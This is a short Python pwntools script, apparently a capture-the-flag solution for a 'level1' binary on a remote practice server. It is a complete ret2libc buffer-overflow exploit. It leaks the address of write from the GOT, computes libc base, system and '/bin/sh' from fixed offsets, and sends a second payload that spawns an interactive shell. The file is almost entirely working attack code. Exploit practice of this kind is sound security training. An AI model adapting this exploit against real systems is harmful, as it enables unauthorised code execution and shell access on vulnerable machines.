from pwn import *


# p = process("./level1")
p = remote("node4.buuoj.cn", 29390)
pro = ELF("./level1") 


write_p = pro.plt["write"]
write_g = pro.got["write"]
start = 0x08048380 


# ret to libc
pad = cyclic(0x88+0x4)+p32(write_p)+p32(start)
pad += p32(1)+p32(write_g)+p32(4)
p.send(pad)

info = u32(p.recv())
print("leak: ", hex(info))

# count
base = info-0xd43c0
system = base+0x3a940
binsh = base+0x15902b

# attack
pad = cyclic(0x88+0x4)
pad += p32(system)+p32(0)+p32(binsh)
p.send(pad)

p.interactive()


